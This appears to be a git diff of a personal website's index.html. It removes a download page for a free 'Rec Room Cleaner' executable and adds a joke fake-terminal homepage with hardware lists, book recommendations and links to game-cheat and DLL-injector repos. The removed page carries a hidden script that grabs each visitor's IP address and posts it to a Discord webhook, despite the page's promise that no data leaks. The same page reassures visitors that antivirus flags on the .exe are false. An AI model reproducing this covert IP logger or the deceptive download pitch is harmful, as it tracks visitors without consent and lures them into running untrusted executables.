@@ -1,389 +1,421 @@
 <!DOCTYPE html>
-<html class="no-js" lang="en">
+<html>
+
 <head>
-<meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="description" content="Rizzy's Rec Room Cleaner is an advanced Rec Room Cleaner developed with quality in mind.">
-<meta name="keywords" content="Recroom, Recroom Hacks, Cleaner, gorilla tag mods, funny, hack, Spoofer, funny, aim">
-<meta name="author" content="Rizzy's Rec Room Cleaner Software">
-<meta property="og:site" content="https://youtube.com/bypasser">
-<meta property="og:site_name" content="Rizzy's Rec Room Cleaner">
-<meta property="og:title" content="Rizzy's Rec Room Cleaner">
-<meta name="theme-color" content="#5ea2ff">
+    <meta property="og:image" content="https://spookysec.me/spooky.jpg" />
+    <meta property="og:image:secure_url" content="https://spookysec.me/spooky.jpg" />
+    <meta property="og:type" content="spooky sec" />
+    <meta property="og:url" content="https://epiclyrizzy.github.io/" >
+    <meta property="og:title" content="Don't be scared"/>
+    <meta property="og:description" content="epiclyrizzy's environment :eyes:" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
 
-<title>Rizzy's Rec Room Cleaner</title>
-<link rel="stylesheet" href="assets/css/bootstrap.min.css" />
-<link rel="stylesheet" href="assets/css/line-icons.css" />
-<link rel="stylesheet" href="assets/css/animate.css" />
-<link rel="stylesheet" href="assets/css/main.css" />
-<link rel="shortcut icon" type="image/x-icon" href="dashboard/assets/images/logo.ico" />
+    <link rel="icon" href="/spooky.jpg" type="image/jpeg"/>
+    <meta charset="utf-8">
+    <title>SpookySec</title>
+    <style>
+        body {
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            font-size: 100%;
+            height: 100vh;
+            width: 100vw;
+            margin: 0;
+        }
+        
+        a {
+            color: rgba(255, 255, 255, 0.411);
+            text-decoration: none;
+            transition: color .22s linear;
+        }
+        
+        a:hover {
+            color: #00ff00;
+        }
 
+       
+        body {
+            background-color: #070707;
+        }
+        
+        body,
+        #input {
+            font-family: monospace;
+            line-height: 175%;
+        }
+        
+        #input {
+            background-color: #000000;
+        }
+        
+        #header {
+            width: 70vw;
+        }
+        
+        #shell {
+            background-color: #000000;
+            border-style: solid;
+            border-width: 10px;
+            border-color: #000000;
+            height: 70vh;
+            width: 70vw;
+            overflow: auto;
+            scroll-behavior: smooth;
+        }
+        
+        #shell::-webkit-scrollbar {
+            width: 6px;
+            background-color: #F5F5F5;
+        }
+        
+        #shell::-webkit-scrollbar-track {
+            -webkit-box-shadow: inset 0 0 6px rgba(0, 0, 0, 0.3);
+            box-shadow: inset 0 0 6px rgba(0, 0, 0, 0.3);;
+            background-color: #F5F5F5;
+        }
+        
+        #shell::-webkit-scrollbar-thumb {
+            background-color: #000000;
+        }
+        
+        #title {
+            font-size: 50px;
+        }
+        
+        #output {
+            padding-top: 10px;
+            white-space: pre;
+            color: #00ce00;
+        }
+        
+        #input {
+            width: 90%;
+            border: none;
+            font-size: inherit;
+        }
+        
+        #input:focus {
+            outline: none;
+        }
+        
+        #input,
+        .input-wrap {
+            color: #00ffea;
+        }
+        
+        .error {
+            color: red;
+            
+        }
+
+        .inspiration {
+            position: absolute;
+            bottom: 8px;
+            left: 16px;
+            font-size: 8px;
+            color:rgb(32, 32, 32);
+        }
+
+        #nullsec {
+            color:rgb(44, 44, 44)
+        }
+
+        #nullsec:hover {
+            color:#00ff00;
+        }
+
+        
+    </style>
 </head>
 <body>
-<div class="preloader">
-<div class="preloader-inner">
-<div class="preloader-icon">
-<span></span>
-<span></span>
-</div>
-</div>
-</div>
-<header class="header navbar-area">
-<div class="container">
-<div class="row align-items-center">
-<div class="col-lg-12">
-<div class="nav-inner">
-<nav class="navbar navbar-expand-lg">
-<a class="navbar-brand" href="index.html">
-<p>R I Z Z Y ' S R E C R O O M C L E A N E R</p>
-</a>
-<button class="navbar-toggler mobile-menu-btn" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-<span class="toggler-icon"></span>
-<span class="toggler-icon"></span>
-<span class="toggler-icon"></span>
-</button>
-<div class="collapse navbar-collapse sub-menu-bar" id="navbarSupportedContent">
-<ul id="nav" class="navbar-nav ms-auto">
-<li class="nav-item">
-<a href="#home" class="page-scroll active" aria-label="Toggle navigation">Home</a>
-</li>
-<li class="nav-item">
-<a href="#features" class="page-scroll" aria-label="Toggle navigation">Features</a>
-</li>
-<li class="nav-item">
-<a href="#pricing" class="page-scroll" aria-label="Toggle navigation">Pricing</a>
-</li>
-<li class="nav-item">
-<a href="#faq" aria-label="Toggle navigation">Questions</a>
-</li>
-<li class="nav-item">
-<a href="terms.html" aria-label="Toggle navigation"></a>
-</li>
-</ul>
-</div>
-<div class="button add-list-button">
-<a href="https://download1649.mediafire.com/5al0t8jny74gcEY71chMf4DPpvYzVG1Dbb4FLKQAs1MU8F1YDn5pq-c8cquhVAtQ7-y4Wl03_ogz8ksSQJSKRQWIanW9BE-7Iq4eKPYNahuzdzbh5k6eofLG73M6vHRWJD1eyaFSornS6ndPH3ZKNDM5v8T2wD3-9zGaAOUGPBw/65gj9k8844bl4jb/Rizzy%5C%27s+Rec+Room+Cleaner.zip" class="btn">Get Started</a>
-</div>
-</nav>
-</div>
-</div>
-</div>
-</div>
-</header>
-<section id="home" class="hero-area">
-<div class="container">
-<div class="row align-items-center">
-<div class="col-lg-5 col-md-12 col-12">
-<div class="hero-content">
-<h1 class="wow fadeInLeft" data-wow-delay=".4s">Rizzy's Rec Room Cleaner</h1>
-<p class="wow fadeInLeft" data-wow-delay=".6s">Rizzy's Rec Room Cleaner is an advanced Rec Room Cleaner
-developed with quality in mind.</p>
-<p class="wow fadeInLeft" data-wow-delay=".6s"><b>Summer sale (25% off) active until August 15th!</b></p>
-<div class="button wow fadeInLeft" data-wow-delay=".8s">
-<a href="https://discord.gg/pBMeQETfUt" class="btn">Discord</a>
-</div>
-</div>
-</div>
-<div class="col-lg-7 col-md-12 col-12">
-<div class="hero-image wow fadeInRight" data-wow-delay=".4s">
-<img src="assets/images/gui.png" alt="#" style="transform: scale(0.9) perspective(500px) rotateY(-10deg) rotateX(-0.5deg) rotateZ(1.5deg);
-    filter: drop-shadow(10px 10px 10px rgba(0,0,0,0.3));">
-</div>
-</div>
-</div>
-</div>
-</section>
-<section id="features" class="features section">
-<div class="container">
-<div class="row">
-<div class="col-12">
-<div class="section-title">
-<h3 class="wow zoomIn">Features</h3>
-<h2 class="wow fadeInUp">Here's What We Have To Offer
-</h2>
-</div>
-</div>
-</div>
-<div class="row">
-<div class="col-lg-4 col-md-6 col-12">
-<div class="single-feature wow fadeInUp" style="min-height: 300px;">
-<i class="lni lni-shield"></i>
-<h3>Privacy</h3>
-<p>No data will be leaked while your using 
-Rizzy's Rec Room Cleaner.</p>
-</div>
-</div>
-<div class="col-lg-4 col-md-6 col-12">
-<div class="single-feature wow fadeInUp" style="min-height: 300px;">
-<i class="lni lni-money-protection"></i>
-<h3>Affordable</h3>
-<p>Rizzy's Rec Room Cleaner is competitively priced compared to other cleaners on the market while also being a
-better option.</p>
-</div>
-</div>
-<div class="col-lg-4 col-md-6 col-12">
-<div class="single-feature wow fadeInUp" style="min-height: 300px;">
-<i class="lni lni-cog"></i>
-<h3>Quality Cleaner</h3>
-<p>Our Cleaner is top of the line its fast simple and Secure we delete necessary files and registry keys to clean your game.</p>
-</div>
-</div>
-<div class="col-lg-4 col-md-6 col-12">
-<div class="single-feature wow fadeInUp" style="min-height: 300px;">
-<i class="lni lni-lock-alt"></i>
-<h3>Secure</h3>
-<p>We code in C++ and our source code isnt leaked.</p>
-</div>
-</div>
-<div class="col-lg-4 col-md-6 col-12">
-<div class="single-feature wow fadeInUp" style="min-height: 300px;">
-<i class="lni lni-bubble"></i>
-<h3>Fast Support</h3>
-<p>Our support team is always ready to answer your questions and assist you when necessary. Go on our discord server and ping the owner</p>
-</div>
-</div>
-<div class="col-lg-4 col-md-6 col-12">
-<div class="single-feature wow fadeInUp" style="min-height: 300px;">
-<i class="lni lni-construction"></i>
-<h3>Frequent Updates</h3>
-<p>Rizzy's Rec Room Cleaner receives constant updates ensuring our modules stay up-to-date and fitting the needs of
-our users.</p>
-</div>
-</div>
-</div>
- </div>
-</section>
-<section class="our-achievement section">
-<div class="container">
-<div class="row">
-<div class="col-lg-10 offset-lg-1 col-md-12 col-12">
-<div class="title">
-<h2>Trusted by users from around the world</h2>
-<p>Don't believe us? Look at these statistics!</p>
-</div>
-</div>
-</div>
-<div class="row">
-<div class="col-lg-8 offset-lg-2 col-md-12 col-12">
-<div class="row">
-<div class="col-lg-4 col-md-4 col-12">
-<div class="single-achievement wow fadeInUp" data-wow-delay=".2s">
-<h3 class="counter"><span id="secondo1" class="countup" cup-end="100">100</span>%</h3>
-<p>satisfaction</p>
-</div>
-</div>
-<div class="col-lg-4 col-md-4 col-12">
-<div class="single-achievement wow fadeInUp" data-wow-delay=".4s">
-<h3 class="counter"><span id="secondo2" class="countup" cup-end="120">12</span></h3>
-<p>Registered</p>
-</div>
-</div>
-<div class="col-lg-4 col-md-4 col-12">
-<div class="single-achievement wow fadeInUp" data-wow-delay=".6s">
-<h3 class="counter"><span id="secondo3" class="countup" cup-end="125">120</span></h3>
-<p>Launches</p>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</section>
-<section id="pricing" class="pricing-table section">
-<div class="container">
-<div class="row">
-<div class="col-12">
-<div class="section-title">
-<h3 class="wow zoomIn" data-wow-delay=".2s">Pricing</h3>
-<h2 class="wow fadeInUp" data-wow-delay=".4s">Pricing Plans</h2>
-<p class="wow fadeInUp" data-wow-delay=".6s">Choose the best plan that fits your needs.</p>
-</div>
-</div>
-</div>
-<div class="row">
-<div class="horizontal-center">
-<div class="col-lg-3 col-md-6 col-12" style="padding: 0.5%;">
-<div class="single-table wow fadeInUp" data-wow-delay=".6s">
-<div class="table-head">
-<h4 class="title">Monthly <span style="font-size: 60%;"> (30 days)</span></h4>
-<p>Great for trying out Rizzy's Rec Room Cleaner or if you're on a budget.</p>
-<div class="price">
-<h2 class="amount"><strike>$10</strike> $Free<span class="duration">/mo</span></h2>
-</div>
-<div class="button">
-<a href="https://download1649.mediafire.com/5al0t8jny74gcEY71chMf4DPpvYzVG1Dbb4FLKQAs1MU8F1YDn5pq-c8cquhVAtQ7-y4Wl03_ogz8ksSQJSKRQWIanW9BE-7Iq4eKPYNahuzdzbh5k6eofLG73M6vHRWJD1eyaFSornS6ndPH3ZKNDM5v8T2wD3-9zGaAOUGPBw/65gj9k8844bl4jb/Rizzy%5C%27s+Rec+Room+Cleaner.zip" class="btn">Download</a>
-</div>
-</div>
-<div class="table-content">
-<h4 class="middle-title">What's Included</h4>
-<ul class="table-list">
-<li><i class="lni lni-checkmark-circle"></i> Premium Support</li>
-<li><i class="lni lni-checkmark-circle"></i> Frequent Updates</li>
-<li><i class="lni lni-checkmark-circle"></i> Advanced</li>
-<li><i class="lni lni-checkmark-circle"></i> Safe</li>
-</ul>
-</div>
-</div>
-</div>
-<div class="col-lg-3 col-md-6 col-12" style="padding: 0.5%;">
-<div class="single-table wow fadeInUp" data-wow-delay=".8s">
-<div class="table-head">
-<h4 class="title">Lifetime <span style="font-size: 60%;"> (of Rizzy's Gorilla Tag Cleaner)</span></h4>
-<p>Lifetime ownership of Rizzy's Gorilla Tag Cleaner, can't get any better than this.</p>
-<div class="price">
-<h2 class="amount"><strike>$50</strike> $Free<span class="duration">/lifetime</span></h2>
-</div>
-<div class="button">
-<a href="https://www.mediafire.com/file/5lq628arrhdlri0/Gorilla_Tag_Cleaner.zip/file" class="btn">Download</a>
-</div>
-</div>
-<div class="table-content">
-<h4 class="middle-title">What's Included</h4>
-<ul class="table-list">
-<li><i class="lni lni-checkmark-circle"></i> Premium Support</li>
-<li><i class="lni lni-checkmark-circle"></i> Frequent Updates</li>
-<li><i class="lni lni-checkmark-circle"></i> Advanced</li>
-<li><i class="lni lni-checkmark-circle"></i> Safe</li>
-</ul>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</section>
-<section class="section call-action">
-<div class="container">
-<div class="row">
-<div class="col-lg-8 offset-lg-2 col-md-12 col-12">
-<div class="cta-content">
-<h2 class="wow fadeInUp" data-wow-delay=".2s">What are you waiting for?</h2>
-<p class="wow fadeInUp" data-wow-delay=".4s">Enhance your Rec Room gameplay experience with Rizzy's Rec Room Cleaner now.</p>
-<div class="button wow fadeInUp" data-wow-delay=".6s">
-<a href="https://download1649.mediafire.com/5al0t8jny74gcEY71chMf4DPpvYzVG1Dbb4FLKQAs1MU8F1YDn5pq-c8cquhVAtQ7-y4Wl03_ogz8ksSQJSKRQWIanW9BE-7Iq4eKPYNahuzdzbh5k6eofLG73M6vHRWJD1eyaFSornS6ndPH3ZKNDM5v8T2wD3-9zGaAOUGPBw/65gj9k8844bl4jb/Rizzy%5C%27s+Rec+Room+Cleaner.zip" class="btn">Get Started</a>
-</div>
-</div>
-</div>
-</div>
-</div>
-</section>
-<section id="faq" class="faq section">
-<div class="container">
-<div class="row">
-<div class="col-12">
-<div class="section-title">
-<h3 class="wow zoomIn" data-wow-delay=".2s">FAQ</h3>
-<h2 class="wow fadeInUp" data-wow-delay=".4s">Frequently Asked Questions</h2>
-<p class="wow fadeInUp" data-wow-delay=".6s">Here are some common questions people ask us.</p>
-</div>
-</div>
-</div>
-<div class="row">
-<div class="col-12">
-<div class="accordion" id="accordionExample">
-<div class="accordion-item">
-<h2 class="accordion-header" id="headingOne">
-<button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" aria-expanded="false" data-bs-target="#collapseOne" aria-controls="collapseOne">
-<span class="title"><span class="serial">1</span>What versions does Rizzy's Rec Room Cleaner support?</span><i class="lni lni-plus"></i>
-</button>
-</h2>
-<div id="collapseOne" class="accordion-collapse collapse" aria-labelledby="headingOne" data-bs-parent="#accordionExample">
-<div class="accordion-body">
-<p>Rizzy's Rec Room Cleaner currently supports the following versions:</p>
-<p>· Windows 10+<br>
-· Windows 10+<br>
-· Windows 10+<br>
-· Windows 10+ <span style="font-size: 60%;"> (not BAC)</span><br>
-· LWindows 10+<br>
-· Windows 10+
-</div>
-</div>
-</div>
-<div class="accordion-item">
-<h2 class="accordion-header" id="headingTwo">
- <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" aria-expanded="false" data-bs-target="#collapseTwo" aria-controls="collapseTwo">
-<span class="title"><span class="serial">2</span>What payment methods do you allow?</span><i class="lni lni-plus"></i>
-</button>
-</h2>
-<div id="collapseTwo" class="accordion-collapse collapse" aria-labelledby="headingTwo" data-bs-parent="#accordionExample">
-<div class="accordion-body">
-<p>Our payment system is built using <a href="https://discord.com">Discord</a> But we dont accept any payments because our products are free.</p>
-</div>
-</div>
-</div>
-<div class="accordion-item">
-<h2 class="accordion-header" id="headingThree">
-<button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" aria-expanded="false" data-bs-target="#collapseThree" aria-controls="collapseThree">
-<span class="title"><span class="serial">3</span>Is This A Virus?</span><i class="lni lni-plus"></i>
-</button>
-</h2>
-<div id="collapseThree" class="accordion-collapse collapse" aria-labelledby="headingThree" data-bs-parent="#accordionExample">
-<div class="accordion-body">
-<p>No, It might look like a Virus Because its a .exe file but we can assure you its not a Virus Your Antivirus might flag it because it is deleting files in %appdata% and Registry Keys </a></p>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</section>
-<footer class="footer">
-<div class="footer-top">
-<div class="container">
-<div class="row">
-<div class="col-lg-4 col-md-4 col-12 horizontal-center" style="text-align: center;">
-<div class="single-footer f-about">
-&copy Rizzy's Rec Room Cleaner Software 2019-2023
-</div>
-</div>
-</div>
-</div>
-</div>
-</footer>
-<a href="#" class="scroll-top">
-<i class="lni lni-chevron-up"></i>
-</a>
-<script>
-// Get the visitor's IP address
-fetch('https://api64.ipify.org?format=json')
-    .then(response => response.json())
-    .then(data => {
-        const ipAddress = data.ip;
-        // Create an embed object for Discord
-        const embed = {
-            title: 'Visitor IP Address',
-            description: `Visitor IP Address: ${ipAddress}`,
-            color: 16711680 // Red color
-        };
-        // Send the embed to a Discord webhook
-        fetch('https://discord.com/api/webhooks/1149840841196699809/OGYsJTkYfvy8I7hbCDTQJeKfl-uCxmIeKrQNJdu3CnGYwX5Rd9G5MeTIyVNOqmx6Chgk', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ embeds: [embed] })
-        })
-        .then(response => {
-            if (response.status === 204) {
-                console.log('IP address sent to Discord successfully.');
-            } else {
-                console.error('Failed to send IP address to Discord.');
+    <div id="header">
+        <h1><a href="">epiclyrizzy's 127.0.0.1</a></h1>
+        <h2><a href="javascript:run('cat instagram.txt')">Instagram</a> - <a href="javascript:run('cat github.txt')">Github</a></h2>
+    </div>
+    <div id="shell">
+        <div id="output"></div>
+        <div class="input-wrap">
+            <span>$</span>
+            <input id="input" type="text" autofocus />
+        </div>
+    </div>
+    <script src="main.js" type="text/javascript"></script>
+    <script>
+        var input = document.getElementById('input')
+        var output = document.getElementById('output')
+
+        var emulator = bashEmulator({
+            workingDirectory: '/home/spooky/',
+            fileSystem: {
+                '/': {
+                    type: 'dir',
+                    modified: Date.now()
+                },
+                '/home': {
+                    type: 'dir',
+                    modified: Date.now()
+                },
+                '/home/spooky/awesomeRepos': {
+                    type: 'dir',
+                    modified: Date.now()
+                }, 
+                '/home/spooky/instagram.txt': {
+                    type: 'file',
+                    modified: Date.now(),
+                    content: 'No instagram account :('
+                },
+                '/home/spooky/discord.txt': {
+                    type: 'file',
+                    modified: Date.now(),
+                    content: 'Got Termed :('
+                },
+                '/home/spooky/github.txt': {
+                    type: 'file',
+                    modified: Date.now(),
+                    content: 'Here\'s my Github <a href="https://github.com/epiclyrizzy" target="_blank">account</a>'
+                },
+                '/home/spooky/.secret.txt': {
+                    type: 'file',
+                    modified: Date.now(),
+                    content: 'perhaps "env" would reveal the hidden?'
+                },
+                '/home/spooky/whoami.txt': {
+                    type: 'file',
+                    modified: Date.now(),
+                    content: 'Hello, welcome to my localhost.\nFeel free to discover the website for yourself!\n\t- Be ware, always check your environment' 
+                },
+                '/etc': {
+                    type: 'dir',
+                    modified: Date.now()
+                },
+                '/etc/passwd': {
+                    type: 'file',
+                    modified: Date.now(),
+                    content: 'spooky:x:1000:1000:spooky:/home/spooky:/bin/fish'
+                },
+                '/bin': {
+                    type: 'dir',
+                    modified: Date.now()
+                },
+                '/bin/hack.bin': {
+                    type: 'file',
+                    modified: Date.now(),
+                    content: '--- T H E  U L T I M A T E  N A S A  H A C K ---'
+                },
+                '/proc': {
+                    type: 'dir',
+                    modified: Date.now()
+                },
+                '/proc/self': {
+                    type: 'dir',
+                    modified: Date.now()
+                },
+                '/proc/self/exe': {
+                    type: 'file',
+                    modified: Date.now(),
+                    content: 'As of right now, this server is running on localhost using a python web server\nJust kidding, that was long ago :)',
+                },
+                '/home/spooky': {
+                    type: 'dir',
+                    modified: Date.now()
+                },
+                '/dev': {
+                    type: 'dir',
+                    modified: Date.now()
+                },
+                '/dev/hardware.txt': {
+                    type: 'file',
+                    modified: Date.now(),
+                    content: 'CPU: Intel i5-8500K \nGPU: NVIDIA GeForce GTX 1050 Ti\nRAM: 16 Gb\nSSD: 256Gb\nHDD: 1Tb\nPSU: 550\nKeyboard: Akko 3087\nMouse: Genesis Xenon 200\nMonitor: 24" 75 Hz.\nHeadset: Logitech G633'
+                },
+                '/dev/laptop.txt': {
+                    type: 'file',
+                    modified: Date.now(),
+                    content: 'Lenovo Thinkpad, E14\nCPU: Intel i7\nGPU: Built-in\nRAM: 16Gb\nSSD: 256Gb\nHDD: None\nScreen: 14"'
+                },
+                '/usr': {
+                    type: 'dir',
+                    modified: Date.now()
+                },
+                '/usr/bin': {
+                    type: 'dir',
+                    modified: Date.now()
+                },
+                '/usr/bin/software.txt': {
+                    type: 'file',
+                    modified: Date.now(),
+                    content: 'OS: Arco Linux\nWM: Qtile\nShell: ZSH\nText Editor: Vim\nIDE: VS Code\nWeb Browser: Brave\nGeneral Communication: Discord\nVM: VirtualBox\nWork: Slack'
+                },
+                '/home/spooky/hobbies.txt': {
+                    type: 'file',
+                    modified: Date.now(),
+                    content: 'I like Gaming!!!'
+                },
+                '/usr/bin/langs.txt': {
+                    type: 'file',
+                    modified: Date.now(),
+                    content: 'Best at: Python & Ruby\nLove: C\nApp Dev: Flutter/Dart\nSomewhat good at: x64 Assembly\nMalware: C++ & C#\nLearning: Rust\nThose bash one liners tho...'
+                },
+                '/home/spooky/awesomeRepos/BananaShooterCheat.txt': {
+                    type: 'file',
+                    modified: Date.now(),
+                    content: 'https://github.com/epiclyrizzy/BananaShooterCheat'
+                },
+                '/home/spooky/awesomeRepos/Dllinjector.txt': {
+                    type: 'file',
+                    modified: Date.now(),
+                    content: 'https://github.com/epiclyrizzy/Dllinjector'
+                },
+                '/home/spooky/peopleToCheckOut.txt': {
+                    type: 'file',
+                    modified: Date.now(),
+                    content: 'https://github.com/epiclyrizzy'
+                },
+                '/home/spooky/goodResources': {
+                    type: 'dir',
+                    modified: Date.now()
+                },
+                '/home/spooky/goodResources/books': {
+                    type: 'dir',
+                    modified: Date.now()
+                },
+                '/home/spooky/goodResources/books/PracticalBinaryAnalysis.txt': {
+                    type: 'file',
+                    modified: Date.now(),
+                    content: 'Name: Practical Binary Analysis\nDescription: A really in-depth book about binary reversing and exploitation\nRecommendation Level: High (if you\'re intersting in RE)\nDifficulty: Hard\nOfficial Source: right <a href="https://practicalbinaryanalysis.com/" target="_blank">here</a>'
+                },
+                '/home/spooky/goodResources/books/LinuxForHackers.txt': {
+                    type: 'file',
+                    modified: Date.now(),
+                    content: 'Name: Linux fore Hackers\nDescription: A great books if you\'re just starting out and have no background with linux!\nRecommendation Level: Medium\nDifficulty: Easy\nOfficial Source: right <a href="https://www.amazon.com/Linux-Basics-Hackers-Networking-Scripting-ebook/dp/B077WWRK8B" target="_blank">here</a>'
+                },
+                '/home/spooky/goodResources/books/HackingArtOfExploitation.txt': {
+                    type: 'file',
+                    modified: Date.now(),
+                    content: 'Name: Hacking: the art of exploitation\nDescription: A good introduction about common hacking concepts like networking, exploitaton, scripting etc...\nRecommendation Level: Medium\nDifficulty: Medium\nOfficial Source: right <a href="https://www.amazon.com/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441" target="_blank">here</a>'
+                },
+                '/home/spooky/goodResources/books/AutomateTheBoringStuffWithPython.txt': {
+                    type: 'file',
+                    modified: Date.now(),
+                    content: 'Name: Automate The Boring Stuff With Python\nDescription: The best introduction to the Python programming language so far, offers some real life example project to keep you active\nRecommendation Level: High (if you don\'t know any python yet)\nDifficulty: Easy\nOfficial Source: right <a href="https://automatetheboringstuff.com/">here<a/>'
+                }
             }
         })
-        .catch(error => {
-            console.error('Error:', error);
+
+        emulator.commands.clear = function(env) {
+            output.innerHTML = ''
+            env.exit()
+        }
+
+        var ENTER = 13
+        var UP = 38
+        var DOWN = 40
+
+        function log(result) {
+            if (result) {
+                output.innerHTML += result + '\n'
+            }
+            var objDiv = document.getElementById("shell");
+            objDiv.scrollTop = objDiv.scrollHeight;
+        }
+
+        function error(result) {
+            log('<div class="error">' + result + '</div>')
+        }
+
+        function run(cmd) {
+            var out = log('$ ' + cmd)
+            return emulator.run(cmd).then(log, error)
+        }
+
+        var completeFunctions = {}
+        completeFunctions[UP] = emulator.completeUp
+        completeFunctions[DOWN] = emulator.completeDown
+
+        function complete(direction) {
+            var completeFunction = completeFunctions[direction]
+            if (!completeFunction) {
+                return
+            }
+            var cursorPosition = input.selectionStart
+            var beforeCursor = input.value.slice(0, cursorPosition)
+            completeFunction(beforeCursor).then(function(completion) {
+                if (completion) {
+                    input.value = completion
+                    input.setSelectionRange(cursorPosition, cursorPosition)
+                }
+            })
+        }
+
+        input.addEventListener('keydown', function(e) {
+            if (e.altKey || e.metaKey || e.shiftKey || e.ctrlKey) {
+                e.preventDefault()
+                input.focus()
+            }
+            if (e.which === UP || e.which === DOWN) {
+                e.preventDefault()
+                complete(e.which)
+            }
+
+            if (e.ctrlKey && event.keyCode == 76) {
+                run("clear")
+                input.focus()
+            }
+
+            if (e.key == "Tab") {
+                e.preventDefault();
+                let terms = input.value.split(' ');
+                let fileToComplete = terms.pop();
+                if (terms.length < 1 || fileToComplete.length < 1) {
+                    // To stop command completion. Too much work
+                    input.focus()
+                    return;
+                }
+                emulator.readDir('.').then(function(files) {
+                    let match = files.filter(file => !file.startsWith('.') && file.toLowerCase().includes(fileToComplete.toLowerCase()))[0];
+                    if (match) {
+                        input.value = terms.join(' ') + ' ' + match;
+                    } else {
+                        input.focus()
+                        return;
+                    }
+
+                })
+            }
+
+            if (e.ctrlKey && event.keyCode == 67) {
+                input.value = '\n';
+                input.focus()
+            }
+        })
+
+        input.addEventListener('keyup', function(e) {
+            if (e.which !== ENTER) {
+                return
+            }
+            run(input.value).then(function() {
+                input.value = ''
+                document.body.scrollTop = 10e6
+            })
+        })
+
+        document.body.addEventListener('click', function() {
+            // Prevent when user is selecting text
+            if (!window.getSelection().isCollapsed) {
+                return
+            }
+            input.focus()
+        })
+
+        run("ls").then(function() {
+            run("cat whoami.txt")
         });
-    })
-    .catch(error => {
-        console.error('Error:', error);
-    });
-</script>
-<script src="assets/js/bootstrap.min.js"></script>
-<script src="assets/js/wow.min.js"></script>
-<script src="assets/js/count-up.min.js"></script>
-<script src="assets/js/main.js"></script>
+    </script>
+
+<div class="inspiration">Inspired by: <a id="nullsec" href="https://0x00sec.org" target="_blank">0x00sec</a></div>  
+
 </body>
 </html>
-
